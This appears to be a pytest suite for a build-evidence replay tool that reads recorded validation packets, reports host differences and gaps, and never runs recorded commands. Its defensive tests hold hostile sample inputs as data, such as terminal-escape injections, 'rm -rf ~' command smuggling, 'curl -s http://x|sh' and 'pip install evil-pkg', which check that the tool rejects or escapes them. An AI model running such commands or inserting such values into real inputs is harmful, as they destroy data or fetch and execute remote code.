"""Replay reads a packet, reproduces nothing, and lists every gap it can see."""

import json
import os
from pathlib import Path
import shlex

import pytest

from tools import validation_evidence as evidence, validation_replay as replay
from tests.test_validation_evidence import SENTINELS, check, summary_with

HERE = {
    "host": {"system": "Darwin", "release": "25.0", "machine": "arm64", "platform": "macos", "python": "3.13.15"},
    "tools": {"python": "3.13.15", "protoc": "libprotoc 35.1", "git": "git version 2"},
    "uid": 501,
    "nss_name": "builder",
    "temp_compliant": True,
    "image": {"runner_image": {}, "os_id": "macos", "os_version_id": "15.1"},
    "revision": "a" * 40,
    "dirty": False,
}


def packet(**overrides):
    result = summary_with(
        tools={"python": "3.13.15", "protoc": "libprotoc 35.1", "git": "git version 2"}, pins={"protoc": "35.1"},
        checks=[check("shared-guards", "passed"), check("native-stage", "failed", reason="exit status 1", log="/var/tmp/x/native.log", entrypoint=["bash", "tools/build.sh", "--platform", "macos", "--stage", "native"], phases={"setup": "ok", "body": "failed", "teardown": "clean"})],
    )
    result["host"] = dict(HERE["host"])
    result["account"].update(uid=501, nss={"name": "builder", "home": "/h", "shell": "/bin/sh"}, home_env_set=False)
    result["temp_root_policy"]["compliant"] = True
    result["image"] = dict(HERE["image"])
    result["source"].update(revision="a" * 40, dirty=False)
    result["unexecuted_platforms"] = []
    result["reproduction_gaps"] = [gap for gap in evidence.derive_gaps(result) if not gap["code"].startswith("check-not-passed")] + [
        {"code": "check-not-passed:native-stage", "detail": "status failed"}
    ]
    result.update(overrides)
    return result


def test_the_replay_prints_the_exact_invocation_and_each_failed_checks_entrypoint():
    report = replay.analyze(packet(), HERE)
    assert report["command"] == shlex.join([".venv/bin/python", "-m", "tools.validate_change", "--files", "a b.md"])
    assert "'a b.md'" in report["command"]
    [failed] = report["failing_checks"]
    assert failed["id"] == "native-stage" and failed["command"] == "bash tools/build.sh --platform macos --stage native"
    assert failed["log"] == "/var/tmp/x/native.log" and failed["phases"]["body"] == "failed"
    text = replay.render(report)
    assert "Check native-stage: failed (exit status 1)" in text and "retained log: /var/tmp/x/native.log" in text
    assert "runs nothing" in text


def test_a_replay_on_the_recorded_host_reports_only_the_packets_own_gaps():
    report = replay.analyze(packet(), HERE)
    assert report["host_mismatches"] == []
    assert {gap["code"] for gap in report["recorded_gaps"]} == {"check-not-passed:native-stage"}
    assert report["gap_count"] == 1


@pytest.mark.parametrize(
    ("change", "code"),
    [
        (lambda here: here["host"].update(platform="linux"), "host-differs:platform"),
        (lambda here: here["host"].update(machine="x86_64"), "host-differs:machine"),
        (lambda here: here["host"].update(system="Linux"), "host-differs:system"),
        (lambda here: here["host"].update(release="26.0"), "host-differs:release"),
        (lambda here: here["host"].update(python="3.12.1"), "host-differs:python"),
        (lambda here: here["tools"].update(protoc="libprotoc 36.2"), "tool-differs:protoc"),
        (lambda here: here["tools"].update(git=None), "tool-missing:git"),
        (lambda here: here.update(uid=0), "account-differs:root"),
        (lambda here: here.update(nss_name="runner"), "account-differs:nss-name"),
        (lambda here: here.update(temp_compliant=False), "temp-root-differs"),
        (lambda here: here["image"].update(os_version_id="14.7"), "image-differs:os_version_id"),
        (lambda here: here["image"].update(os_id="ubuntu"), "image-differs:os_id"),
        (lambda here: here.update(revision="b" * 40), "revision-differs"),
        (lambda here: here.update(revision=None), "revision-unobserved-here"),
        (lambda here: here.update(dirty=True), "dirty-here"),
    ],
)
def test_each_difference_between_the_recorded_host_and_this_one_is_a_named_gap(change, code):
    here = json.loads(json.dumps(HERE))
    change(here)
    codes = [gap["code"] for gap in replay.host_mismatches(packet(), here)]
    assert codes == [code]


def test_tool_python_and_unrecorded_tools_never_count_as_differences():
    here = json.loads(json.dumps(HERE))
    here["tools"]["python"] = "3.13.99"
    here["tools"]["cmake"] = "cmake 4"
    assert replay.host_mismatches(packet(), here) == []
    assert replay.host_mismatches(packet(tools=None), HERE) == []


def test_the_replay_lists_unexecuted_platforms_and_pin_mismatches_from_the_packet():
    stale = packet()
    stale["tool_pins"]["protoc"]["matches"] = False
    stale["unexecuted_platforms"] = ["linux"]
    stale["reproduction_gaps"] = evidence.derive_gaps(stale)
    codes = {gap["code"] for gap in replay.analyze(stale, HERE)["recorded_gaps"]}
    assert {"pin-mismatch:protoc", "unexecuted-platform:linux"} <= codes


def test_schema_one_packets_have_their_gaps_derived():
    legacy = packet()
    legacy["schema"] = 1
    for key in ("tool_pins", "concurrency", "cache", "artifacts", "reproduction_gaps"):
        legacy.pop(key)
    legacy["tool_pins"] = {}
    legacy["source"]["dirty"] = None
    report = replay.analyze(legacy, HERE)
    assert report["schema"] == 1
    assert {gap["code"] for gap in report["recorded_gaps"]} >= {"change-set-dirty-unknown", "check-not-passed:native-stage"}


def write(tmp_path, content, name="evidence.json"):
    path = tmp_path / name
    path.write_text(content if isinstance(content, str) else json.dumps(content))
    return path


def test_cli_exit_status_follows_the_gaps_and_the_packet(tmp_path, capsys):
    path = write(tmp_path, packet())
    assert replay.main([str(path)], observe=lambda: HERE) == 0
    assert replay.main([str(path), "--check"], observe=lambda: HERE) == 1
    clean = packet(reproduction_gaps=[])
    clean["source"]["dirty"] = False
    clean["checks"] = [check("shared-guards", "passed")]
    assert replay.main([str(write(tmp_path, clean, "clean.json")), "--check"], observe=lambda: HERE) == 0
    capsys.readouterr()
    assert replay.main([str(path), "--json"], observe=lambda: HERE) == 0
    assert json.loads(capsys.readouterr().out)["failing_checks"][0]["id"] == "native-stage"


@pytest.mark.parametrize("content", ["{not json", "[]", json.dumps({"schema": 9, "kind": evidence.KIND})])
def test_an_unreadable_or_foreign_packet_exits_two(tmp_path, content, capsys):
    assert replay.main([str(write(tmp_path, content))], observe=lambda: HERE) == 2
    assert "validation_replay:" in capsys.readouterr().err
    assert replay.main([str(tmp_path / "missing.json")], observe=lambda: HERE) == 2


def test_the_replay_never_prints_a_value_from_outside_the_packet_allowlist(tmp_path, capsys):
    secret = summary_with(environ={**SENTINELS, "GITHUB_RUN_ID": "9"}, tools={"python": "3.13.15"})
    replay.main([str(write(tmp_path, secret)), "--json"], observe=lambda: HERE)
    output = capsys.readouterr().out
    for name, value in SENTINELS.items():
        assert value not in output, name


def test_observe_host_reads_this_host():
    here = replay.observe_host()
    assert {"host", "tools", "uid", "nss_name", "temp_compliant", "image", "revision", "dirty"} <= here.keys()
    assert here["host"]["platform"] in ("linux", "macos")


# ------------------------------------------------------------ review round: gaps a reader must not miss

def test_a_plan_only_or_dirty_packet_keeps_its_gaps_even_when_the_packet_records_none():
    plan = packet(mode="plan-only", status="plan-only", full_validation=False, reproduction_gaps=[])
    plan["checks"] = [check("shared-guards", "planned")]
    codes = {gap["code"] for gap in replay.analyze(plan, HERE)["recorded_gaps"]}
    assert "not-executed" in codes
    dirty = packet(reproduction_gaps=[])
    dirty["checks"] = [check("shared-guards", "passed")]
    dirty["source"]["dirty"] = True
    assert "dirty-at-recording" in {gap["code"] for gap in replay.analyze(dirty, HERE)["recorded_gaps"]}


def test_a_packet_that_omits_a_gap_it_implies_cannot_pass_the_check(tmp_path):
    stale = packet()
    stale["reproduction_gaps"] = [{"code": "check-not-passed:native-stage", "detail": "status failed"}]
    stale["unexecuted_platforms"] = ["linux"]
    stale["source"]["dirty"] = True
    report = replay.analyze(stale, HERE)
    assert {gap["code"] for gap in report["recorded_gaps"]} == {"check-not-passed:native-stage", "unexecuted-platform:linux", "dirty-at-recording"}
    assert [gap["code"] for gap in report["recorded_gaps"]][0] == "check-not-passed:native-stage"  # the packet's own entries stay first
    assert replay.main([str(write(tmp_path, stale)), "--check"], observe=lambda: HERE) == 1


def test_observe_git_reads_revision_and_dirtiness_and_never_guesses(tmp_path):
    assert replay.observe_git(tmp_path) == {"revision": None, "dirty": None}  # no .git: not observed
    (tmp_path / ".git").mkdir()
    calls = []

    def answer(stdout, code=0):
        def run(argv, **kwargs):
            calls.append(argv)
            return type("R", (), {"stdout": stdout[argv[4]], "returncode": code})()
        return run

    out = {"rev-parse": f"{'c' * 40}\n", "status": " M tools/x.py\n"}
    assert replay.observe_git(tmp_path, run=answer(out)) == {"revision": "c" * 40, "dirty": True}
    assert calls[0][:4] == ["git", "--no-optional-locks", "-C", str(tmp_path)] and calls[1][4] == "status"
    assert replay.observe_git(tmp_path, run=answer({"rev-parse": "d" * 40, "status": ""})) == {"revision": "d" * 40, "dirty": False}
    assert replay.observe_git(tmp_path, run=answer(out, code=128)) == {"revision": None, "dirty": None}

    def broken(argv, **kwargs):
        raise FileNotFoundError

    assert replay.observe_git(tmp_path, run=broken) == {"revision": None, "dirty": None}


def test_a_declared_revision_is_not_compared_and_an_unrecorded_one_is_ignored():
    declared = packet()
    declared["source"]["revision_declared"] = True
    here = json.loads(json.dumps(HERE))
    here["revision"] = "b" * 40
    assert replay.host_mismatches(declared, here) == []
    unrecorded = packet()
    unrecorded["source"]["revision"] = None
    assert replay.host_mismatches(unrecorded, here) == []


@pytest.mark.parametrize(
    "damage",
    [
        lambda p: p.update(checks=3),
        lambda p: p.update(source="main"),
        lambda p: p["checks"].append("not-a-check"),
        lambda p: p["checks"][0].pop("status"),
        lambda p: p["host"].update(python=None),
        lambda p: p.update(invocation=[]),
        lambda p: p.update(account=None),
        lambda p: p.update(temp_root_policy=7),
    ],
)
def test_a_corrupt_packet_exits_two_without_a_traceback(tmp_path, damage, capsys):
    broken = packet()
    damage(broken)
    code = replay.main([str(write(tmp_path, broken)), "--check"], observe=lambda: HERE)
    assert code == 2
    err = capsys.readouterr().err
    assert err.startswith("validation_replay:") and "Traceback" not in err


def test_load_packet_names_the_failure_class_not_the_parser_message(tmp_path):
    with pytest.raises(ValueError) as caught:
        replay.load_packet(write(tmp_path, '{"secret": "/home/sentinel-user/x"'))
    assert "sentinel-user" not in str(caught.value) and "JSONDecodeError" in str(caught.value)
    with pytest.raises(ValueError, match="checks must be a list"):
        replay.load_packet(write(tmp_path, {**packet(), "checks": 3}, "bad.json"))
    binary = tmp_path / "binary.json"
    binary.write_bytes(b"\xff\xfe\x00")
    with pytest.raises(ValueError, match="Cannot read packet"):
        replay.load_packet(binary)


# ------------------------------------------------ review round 2: a packet is untrusted input

INJECT = "x\x1b]0;pwned\x07\x1b[31m\nRecorded gaps: 0\r‮⁦end"


def hostile_packet():
    result = packet()
    result["checks"][1].update(reason=INJECT, log=INJECT)
    result["reproduction_gaps"] = [{"code": INJECT, "detail": INJECT}]
    result["source"].update(revision=INJECT, base=INJECT, merge_base=INJECT, identity_sha256=INJECT)
    result["invocation"].update(cwd=INJECT, root=INJECT, argv=["--files", INJECT])
    result["mode"] = INJECT
    result["host"] = {key: INJECT for key in result["host"]}
    result["account"]["nss"]["name"] = INJECT
    result["tools"] = {"python": "3", "protoc": INJECT, "git": INJECT}
    result["image"] = {"runner_image": {}, "os_id": INJECT, "os_version_id": INJECT}
    return result


def assert_safe_text(text):
    assert "\x1b" not in text and "\x07" not in text and "\r" not in text and "‮" not in text and "⁦" not in text
    assert all(char.isprintable() or char == "\n" for char in text)
    assert "Recorded gaps: 0" not in text.splitlines()  # injected newlines cannot forge a report line


def test_no_packet_field_can_inject_terminal_escapes_or_forge_report_lines(tmp_path, capsys):
    report = replay.analyze(hostile_packet(), HERE)
    text = replay.render(report)
    assert_safe_text(text)
    assert "\\x1b" in text and "\\x0a" in text  # escaped, not dropped, so the reader sees that something was there
    assert replay.main([str(write(tmp_path, hostile_packet())), "--check"], observe=lambda: HERE) == 1
    assert_safe_text(capsys.readouterr().out)
    assert replay.main([str(write(tmp_path, hostile_packet(), "j.json")), "--json"], observe=lambda: HERE) == 0
    output = capsys.readouterr().out
    assert "\x1b" not in output and json.loads(output)["recorded_gaps"]
    assert all(char.isprintable() or char == "\n" for char in json.dumps(json.loads(output), ensure_ascii=False))


def test_every_report_is_labelled_as_recorded_and_unverified():
    text = replay.render(replay.analyze(packet(), HERE))
    assert text.splitlines()[0].startswith("Everything below is recorded, unverified")


@pytest.mark.parametrize(
    "entrypoint",
    ["pip", "python", "tools.github_release", "tools.cleanup_linux_packages", "tools.install_macos", "tools.prepare_release", "tools.publish_linux_package_aliases", "tools.check_local_validation", "tools.validate_change; rm -rf ~", "tools.Validate_Change", "tools.a.b", "tools.", "tools.does_not_exist", "os.system", ["tools.validate_change"], 7],
)
def test_only_an_existing_repository_tools_module_is_offered_as_a_reproduction_command(entrypoint):
    hostile = packet()
    hostile["invocation"].update(entrypoint=entrypoint, argv=["install", "evil-pkg"])
    report = replay.analyze(hostile, HERE)
    assert report["command"] is None and report["command_status"].startswith("unrecorded")
    text = replay.render(report)
    assert "evil-pkg" not in text and "pip install" not in text and "Reproduce: unrecorded" in text


def test_the_recorded_tools_module_and_arguments_are_offered_only_when_both_are_well_formed():
    assert replay.analyze(packet(), HERE)["command"].startswith(".venv/bin/python -m tools.validate_change")
    bad = packet()
    bad["invocation"]["argv"] = ["--files", 3]
    assert replay.analyze(bad, HERE)["command"] is None
    bad["invocation"]["argv"] = "--files x"
    assert replay.analyze(bad, HERE)["command_status"].startswith("unrecorded")
    omitted = packet()
    omitted["invocation"].pop("entrypoint")
    assert replay.analyze(omitted, HERE)["command"].startswith(".venv/bin/python -m tools.validate_change")


@pytest.mark.parametrize(
    ("argv", "offered"),
    [
        (["bash", "tools/build.sh", "--platform", "macos", "--stage", "native"], True),
        (["bash", "tools/build.sh", "--platform", "macos", "--stage", "package"], False),
        (["bash", "tools/build.sh", "--platform", "macos", "--stage", "native", "--extra"], False),
        (["pip", "install", "evil-pkg", "--stage", "native"], False),
        (["bash", "tools/build.sh", "--platform", "macos"], False),
        ("bash tools/build.sh", False),
        (None, False),
        ([], False),
    ],
)
def test_a_failed_checks_entrypoint_is_printed_only_when_it_matches_the_inventory_gate(argv, offered):
    hostile = packet()
    hostile["checks"][1]["entrypoint"] = argv
    # A string entrypoint is not valid evidence at all.
    if isinstance(argv, str):
        with pytest.raises(ValueError, match="entrypoint must list text"):
            evidence.validate_summary(hostile)
        return
    [failed] = replay.analyze(hostile, HERE)["failing_checks"]
    assert (failed["command"] is not None) is offered
    assert failed["command_status"].startswith("matches" if offered else "unrecorded")
    if not offered:
        assert "evil-pkg" not in replay.render(replay.analyze(hostile, HERE))


def test_a_check_that_is_not_a_repository_gate_never_shows_its_entrypoint():
    unknown = packet()
    unknown["checks"][1].update(id="not-a-gate", entrypoint=["bash", "tools/build.sh", "--platform", "macos", "--stage", "native"])
    [failed] = replay.analyze(unknown, HERE)["failing_checks"]
    assert failed["command"] is None and "does not match" in failed["command_status"]
    assert not replay.matches_gate(["/opt/py 3/bin/python", "-m", "tools.check_local_validation"], ["{python}", "-m", "tools.check_local_validation"])
    assert not replay.matches_gate(["/x/python", "-m", "tools.other"], ["{python}", "-m", "tools.check_local_validation"])
    assert replay.load_gates(Path("/nonexistent-root")) == {}
    assert "shared-guards" in replay.load_gates()


def test_printed_text_is_bounded():
    big = packet()
    big["checks"][1]["reason"] = "r" * 100_000
    big["reproduction_gaps"] = [{"code": f"g{i}", "detail": "d"} for i in range(5_000)]
    report = replay.analyze(big, HERE)
    assert len(report["failing_checks"][0]["reason"]) < replay.TEXT_LIMIT + 40
    assert len(report["recorded_gaps"]) == replay.LIST_LIMIT and report["gap_count"] >= 5_000
    assert len(replay.render(report).splitlines()) < 2 * replay.LIST_LIMIT + 40


def test_neutralize_and_clean_escape_every_nonprintable_range():
    assert replay.neutralize("a\tb\x00\x7f\u0085​\U000e0001") == "a\\x09b\\x00\\x7f\\x85\\u200b\\U000e0001"
    assert replay.clean({"k\n": ["v\x1b", 3, None, True, 1.5, ("t\x07",)], 5: object.__name__}) == {
        "k\\x0a": ["v\\x1b", 3, None, True, 1.5, ["t\\x07"]], "5": "object",
    }
    assert replay.clean(b"\x1b")  # an unexpected type is rendered as text, never passed through
    assert "\x1b" not in replay.clean(b"\x1b")


# ------------------------------------------------ review round 2: refusing what cannot be read safely

def test_deeply_nested_json_is_a_refusal_not_a_crash(tmp_path, capsys):
    path = write(tmp_path, "[" * 200_000)
    assert replay.main([str(path)], observe=lambda: HERE) == 2
    err = capsys.readouterr().err
    assert err.startswith("validation_replay:") and "Traceback" not in err


def test_a_fifo_or_oversized_or_growing_packet_is_refused_without_hanging(tmp_path, monkeypatch):
    import threading

    fifo = tmp_path / "fifo.json"
    os.mkfifo(fifo)
    codes = []
    worker = threading.Thread(target=lambda: codes.append(replay.main([str(fifo)], observe=lambda: HERE)), daemon=True)
    worker.start()
    worker.join(timeout=10)
    assert not worker.is_alive() and codes == [2]

    monkeypatch.setattr(replay, "MAX_PACKET_BYTES", 100)
    big = write(tmp_path, json.dumps(packet()), "big.json")
    assert replay.main([str(big)], observe=lambda: HERE) == 2
    with pytest.raises(ValueError, match="larger than 100 bytes"):
        replay.read_packet_bytes(big)
    assert replay.main([str(tmp_path / "dir-not-file")], observe=lambda: HERE) == 2
    (tmp_path / "adir").mkdir()
    assert replay.main([str(tmp_path / "adir")], observe=lambda: HERE) == 2


def test_an_error_in_reading_names_the_class_and_escapes_the_path(tmp_path, capsys):
    odd = tmp_path / "bad\x1b[31mname.json"
    assert replay.main([str(odd)], observe=lambda: HERE) == 2
    err = capsys.readouterr().err
    assert "\x1b" not in err and "FileNotFoundError" in err


@pytest.mark.parametrize(
    "damage",
    [
        lambda p: p.update(checks=["x"]),
        lambda p: p.update(reproduction_gaps="abc"),
        lambda p: p.update(reproduction_gaps=[1]),
        lambda p: p.update(tool_pins={"a": 1}),
        lambda p: p["concurrency"].update(settings={"FORESIGHT_BUILD_JOBS": "4\n; rm"}),
        lambda p: p.update(artifacts=[1]),
        lambda p: p.update(unexecuted_platforms=[1]),
        lambda p: p["environment"].update(CI=1),
        lambda p: p["host"].update(python=3),
        lambda p: p["checks"][0].update(reason=7),
        lambda p: p["checks"][0].update(entrypoint=[1]),
        lambda p: p["checks"][0].update(phases=[]),
        lambda p: p.update(status=["failed"]),
        lambda p: p.update(image=[]),
    ],
)
def test_a_packet_with_values_of_the_wrong_type_is_refused_by_validation(tmp_path, damage, capsys):
    broken = packet()
    damage(broken)
    with pytest.raises((ValueError, KeyError, TypeError)):
        evidence.validate_summary(broken)
    assert replay.main([str(write(tmp_path, broken))], observe=lambda: HERE) == 2
    assert "Traceback" not in capsys.readouterr().err


def test_replay_runs_only_short_probes_on_this_host(monkeypatch):
    seen = {}
    monkeypatch.setattr(replay.validation_evidence, "observe_tools", lambda **kw: seen.update(kw) or {"python": "3"})
    replay.observe_host()
    assert seen == {"timeout": replay.PROBE_TIMEOUT_SECONDS}
    timeouts = []

    def run(argv, **kwargs):
        timeouts.append(kwargs["timeout"])
        return type("R", (), {"stdout": "x", "returncode": 0})()

    import tempfile

    with tempfile.TemporaryDirectory() as root:
        (Path(root) / ".git").mkdir()
        replay.observe_git(Path(root), run=run)
    assert timeouts == [replay.PROBE_TIMEOUT_SECONDS] * 2
    assert "runs only" in replay.__doc__ and "never runs a recorded command" in replay.__doc__


def test_a_fifo_with_a_writer_is_still_not_a_packet(tmp_path):
    import threading

    fifo = tmp_path / "live.json"
    os.mkfifo(fifo)
    body = json.dumps(packet()).encode()

    def feed():
        try:
            with open(fifo, "wb") as stream:  # blocks until the replay opens its end
                stream.write(body)
        except OSError:
            pass  # the replay refused and closed its end first; that is the expected outcome

    threading.Thread(target=feed, daemon=True).start()
    with pytest.raises(ValueError, match="not a regular file"):
        replay.read_packet_bytes(fifo)


def test_whatever_else_an_untrusted_packet_breaks_is_a_refusal(tmp_path, monkeypatch, capsys):
    monkeypatch.setattr(replay, "analyze", lambda *a, **k: 1 / 0)
    assert replay.main([str(write(tmp_path, packet()))], observe=lambda: HERE) == 2
    err = capsys.readouterr().err
    assert "malformed (ZeroDivisionError)" in err and "Traceback" not in err


# ------------------------------------------------ review round 3

def test_an_explicit_file_list_packet_has_no_revision_and_says_so():
    explicit = packet()
    explicit["source"].update(mode="explicit", revision=None)
    explicit["reproduction_gaps"] = []
    report = replay.analyze(explicit, HERE)
    assert "revision-unrecorded" in {gap["code"] for gap in report["recorded_gaps"]}
    assert report["gap_count"] >= 1
    assert replay.host_mismatches(explicit, HERE) == []  # nothing to compare, hence the recorded gap


def test_a_source_export_packet_replayed_elsewhere_cannot_pass_the_check(tmp_path):
    explicit = packet()
    explicit["source"].update(mode="explicit", revision=None)
    explicit["checks"] = [check("shared-guards", "passed")]
    explicit["reproduction_gaps"] = []
    assert replay.main([str(write(tmp_path, explicit)), "--check"], observe=lambda: HERE) == 1
    explicit["source"]["revision"] = "a" * 40
    assert replay.main([str(write(tmp_path, explicit, "with.json")), "--check"], observe=lambda: HERE) == 0


GATE = ["{python}", "-m", "tools.check_local_validation"]


@pytest.mark.parametrize(
    ("argv", "offered"),
    [
        (["/Users/ada/repo/.venv/bin/python", "-m", "tools.check_local_validation"], True),
        (["/usr/bin/python3", "-m", "tools.check_local_validation"], True),
        (["/opt/hostedtoolcache/Python/3.13.1/x64/bin/python3.13", "-m", "tools.check_local_validation"], True),
        ([".venv/bin/python", "-m", "tools.check_local_validation"], True),
        (["python", "-m", "tools.check_local_validation"], True),
        (["/tmp/payload", "-m", "tools.check_local_validation"], False),
        (["/tmp/python3", "-m", "tools.check_local_validation"], False),
        (["/var/tmp/x/python", "-m", "tools.check_local_validation"], False),
        (["/private/tmp/x/python3.13", "-m", "tools.check_local_validation"], False),
        (["/dev/shm/python", "-m", "tools.check_local_validation"], False),
        (["/var/folders/zz/abc/T/python3", "-m", "tools.check_local_validation"], False),
        (["/private/var/folders/zz/abc/T/venv/bin/python", "-m", "tools.check_local_validation"], False),
        (["/usr/bin/bash", "-m", "tools.check_local_validation"], False),
        (["/usr/bin/python3x", "-m", "tools.check_local_validation"], False),
        (["/usr/bin/../../tmp/python", "-m", "tools.check_local_validation"], False),
        (["/usr/bin/python\n", "-m", "tools.check_local_validation"], False),
        (["/usr/bin/python", "-m", "tools.other"], False),
    ],
)
def test_the_python_placeholder_is_an_interpreter_not_an_arbitrary_path(argv, offered):
    assert replay.matches_gate(argv, GATE) is offered


def test_platform_and_path_placeholders_are_constrained():
    template = ["bash", "tools/build.sh", "--platform", "{platform}", "--output", "{output}/integration-models", "{build_dir}/native/{native_library}"]
    good = ["bash", "tools/build.sh", "--platform", "linux", "--output", "/var/tmp/o/integration-models", "build/native/libx.so"]
    assert replay.matches_gate(good, template) is True
    assert replay.matches_gate([*good[:3], "windows", *good[4:]], template) is False
    assert replay.matches_gate([*good[:3], "linux; rm", *good[4:]], template) is False
    assert replay.matches_gate([*good[:5], "/a/../../etc/integration-models", good[6]], template) is False
    assert replay.matches_gate([*good[:6], "../x/native/libx.so"], template) is False
    assert replay.matches_gate([*good[:6], "b/native/\x1b[31m"], template) is False
    assert replay.matches_gate([*good[:5], "/var/tmp/o/integration-models", "native/x"], template) is False  # the literal /native/ is missing
    assert replay.matches_gate(good, [*template[:-1], "{unknown_kind}"]) is True


def test_a_replaced_interpreter_is_reported_as_unrecorded_in_the_report():
    hostile = packet()
    hostile["checks"][1].update(id="shared-guards", entrypoint=["/tmp/payload", "-m", "tools.check_local_validation"])
    [failed] = replay.analyze(hostile, HERE)["failing_checks"]
    assert failed["command"] is None and failed["command_status"].startswith("unrecorded")
    hostile["checks"][1]["entrypoint"] = ["/usr/bin/python3", "-m", "tools.check_local_validation"]
    assert replay.analyze(hostile, HERE)["failing_checks"][0]["command"].startswith("/usr/bin/python3")


# ------------------------------------------------ review round 4

HOSTILE_KEY = "\x1b]0;PWNED\x07EVIL"


@pytest.mark.parametrize(
    "damage",
    [
        lambda p: p["environment"].update({HOSTILE_KEY: "1"}),  # outside the allowlist
        lambda p: p["checks"][0].update(id=HOSTILE_KEY, phases={"setup": HOSTILE_KEY}),  # invalid phase value
        lambda p: p["checks"][0].update(phases={HOSTILE_KEY: "ok"}),  # invalid phase name
        lambda p: p["checks"][0].update(id=HOSTILE_KEY, status=HOSTILE_KEY),  # unknown check status
        lambda p: p["checks"][0].update(id=HOSTILE_KEY, reason=5),  # a field error naming the check
        lambda p: p["checks"][0].update(id=HOSTILE_KEY, entrypoint="x"),
        lambda p: p["checks"][0].update(id=HOSTILE_KEY, phases=[]),
        lambda p: p.update({HOSTILE_KEY: 1, "status": HOSTILE_KEY}),
        lambda p: p.pop("tool_pins"),
        lambda p: p.update(mode=HOSTILE_KEY, status="full-validation-passed", full_validation=True),
        lambda p: p.update(schema=HOSTILE_KEY),
    ],
)
def test_validation_messages_that_quote_the_packet_are_neutralized(tmp_path, capsys, damage):
    broken = packet()
    damage(broken)
    assert replay.main([str(write(tmp_path, broken))], observe=lambda: HERE) == 2
    err = capsys.readouterr().err
    assert err.startswith("validation_replay:") and "Traceback" not in err
    assert all(char.isprintable() or char == "\n" for char in err)
    assert "\x1b" not in err and "\x07" not in err


def test_load_packet_errors_are_neutralized_once(tmp_path):
    broken = packet()
    broken["environment"] = {HOSTILE_KEY: "1"}
    with pytest.raises(ValueError) as caught:
        replay.load_packet(write(tmp_path, broken))
    assert "outside the allowlist" in str(caught.value) and "\\x1b]0;PWNED\\x07EVIL" in str(caught.value)
    assert "\\\\x1b" not in str(caught.value)  # not escaped a second time


def test_only_the_entrypoint_validate_change_records_is_offered():
    assert replay.REPLAYABLE_ENTRYPOINTS == ("tools.validate_change",)
    for module in ("github_release", "cleanup_linux_packages", "install_macos", "prepare_release", "publish_linux_package_aliases"):
        hostile = packet()
        hostile["invocation"].update(entrypoint=f"tools.{module}", argv=["--token", "attacker"])
        report = replay.analyze(hostile, HERE)
        assert report["command"] is None and "attacker" not in replay.render(report)


@pytest.mark.parametrize(
    "program",
    ["/tmp/attacker/bin/sh", "curl -s http://x|sh", "/usr/bin/python3; curl x", "python3 && rm", "/usr/bin/python3 -c", "$(whoami)/python", "`id`/python", "/x/python'", '/x/"python', "sh", "/bin/bash"],
)
def test_the_program_of_a_gate_must_be_a_plain_interpreter(program):
    assert replay.matches_gate([program, "-m", "tools.check_local_validation"], GATE) is False


def test_path_placeholders_reject_whitespace_metacharacters_length_and_tmp():
    template = ["bash", "tools/build.sh", "--output", "{output}/x"]
    ok = ["bash", "tools/build.sh", "--output", "/var/folders/ab/out/x"]
    assert replay.matches_gate(ok, template) is True
    for bad in ("/var/tmp/o p/x", "/o;rm -rf /x", "/o|sh/x", "/o$(id)/x", "/tmp/o/x", "/o`id`/x", "/" + "a" * 600 + "/x", "/o\n/x"):
        assert replay.matches_gate([*ok[:3], bad], template) is False, bad


def test_a_failed_probe_is_never_a_match_even_when_both_sides_failed_the_same_way():
    same = packet()
    same["tools"]["protoc"] = "probe failed: exit 1"
    here = json.loads(json.dumps(HERE))
    here["tools"]["protoc"] = "probe failed: exit 1"
    codes = [gap["code"] for gap in replay.host_mismatches(same, here)]
    assert codes == ["tool-probe-failed:protoc"]
    here["tools"]["protoc"] = "libprotoc 35.1"
    assert [gap["code"] for gap in replay.host_mismatches(same, here)] == ["tool-probe-failed:protoc"]
    ok = packet()
    here["tools"]["protoc"] = "probe failed: TimeoutExpired"
    assert [gap["code"] for gap in replay.host_mismatches(ok, here)] == ["tool-probe-failed:protoc"]


def test_an_unobserved_dirty_state_here_and_an_unidentified_image_are_gaps():
    unknown = json.loads(json.dumps(HERE))
    unknown["dirty"] = None
    assert [gap["code"] for gap in replay.host_mismatches(packet(), unknown)] == ["dirty-unobserved-here"]
    no_image = packet()
    no_image["image"] = {"runner_image": {}, "os_id": None, "os_version_id": None}
    no_image["reproduction_gaps"] = []
    assert "image-unrecorded" in {gap["code"] for gap in replay.analyze(no_image, HERE)["recorded_gaps"]}
    legacy = packet()
    legacy["schema"] = 1
    for key in ("tool_pins", "concurrency", "cache", "artifacts", "reproduction_gaps", "image"):
        legacy.pop(key)
    assert "image-unrecorded" in {gap["code"] for gap in replay.analyze(legacy, HERE)["recorded_gaps"]}


@pytest.mark.parametrize(
    ("text", "shown"),
    [
        ("plain text", "plain text"),
        ("a\\x1b literal", "a\\\\x1b literal"),  # a typed backslash is distinguishable from an escaped ESC
        ("\x1b", "\\x1b"),
        ("hangul\u3164filler", "hangul\\u3164filler"),
        ("braille\u2800blank", "braille\\u2800blank"),
        ("vs\ufe0f16", "vs\\ufe0f16"),
        ("e\u0301 combining", "e\\u0301 combining"),
        ("zero\u200bwidth", "zero\\u200bwidth"),
        ("caf\u00e9", "caf\\xe9"),
        ("emoji \U0001f600", "emoji \\U0001f600"),
        ("tab\there", "tab\\x09here"),
    ],
)
def test_neutralize_escapes_backslashes_and_everything_outside_printable_ascii(text, shown):
    assert replay.neutralize(text) == shown


def test_invisible_look_alike_packet_strings_cannot_pass_as_plain_text():
    hostile = packet()
    hostile["checks"][1]["reason"] = "ok\u3164\u2800"
    [failed] = replay.analyze(hostile, HERE)["failing_checks"]
    assert failed["reason"] == "ok\\u3164\\u2800"
    assert all(0x20 <= ord(char) <= 0x7E or char == "\n" for char in replay.render(replay.analyze(hostile, HERE)))


def test_only_the_three_known_phases_are_shown_and_a_schema_one_packet_cannot_widen_them():
    wide = packet()
    wide["schema"] = 1
    for key in ("tool_pins", "concurrency", "cache", "artifacts", "reproduction_gaps", "image"):
        wide.pop(key)
    wide["checks"][1]["phases"] = {"setup": "ok", "body": "failed", "teardown": "clean", **{f"extra{i}": "x" * 5000 for i in range(500)}}
    [failed] = replay.analyze(wide, HERE)["failing_checks"]
    assert set(failed["phases"]) == {"setup", "body", "teardown"}
    wide["checks"][1]["phases"] = {"unknown": "x"}
    assert replay.analyze(wide, HERE)["failing_checks"][0]["phases"] is None


def test_git_is_asked_without_optional_locks_and_the_docstring_says_what_runs():
    assert "--no-optional-locks" in Path(replay.__file__).read_text()
    assert "git status" in replay.__doc__ and "--version" in replay.__doc__ and "flutter" in replay.__doc__


def test_the_packets_own_recorded_temp_roots_are_untrusted_interpreter_locations():
    hostile = packet()
